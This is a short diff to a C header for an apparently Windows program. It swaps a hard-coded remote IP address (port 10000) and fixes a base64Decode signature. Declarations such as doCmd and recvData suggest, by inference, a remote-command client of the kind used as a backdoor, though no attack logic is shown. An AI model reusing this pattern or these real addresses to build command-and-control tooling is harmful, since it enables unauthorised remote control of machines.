@@ -9,7 +9,7 @@
 #include <Windows.h>
 #include <string.h>
 
-#define IP_ADDRESS "164.132.117.34"
+#define IP_ADDRESS "185.8.172.111"
 #define PORT 10000
 #define SOCK_BUFFER 4096
 
@@ -24,4 +24,4 @@ int doCmd(char* command);
 char* recvData();
 
 // Encode/Decode
-char* base64Decode(char data, int size);
+char* base64Decode(char data[], int size);
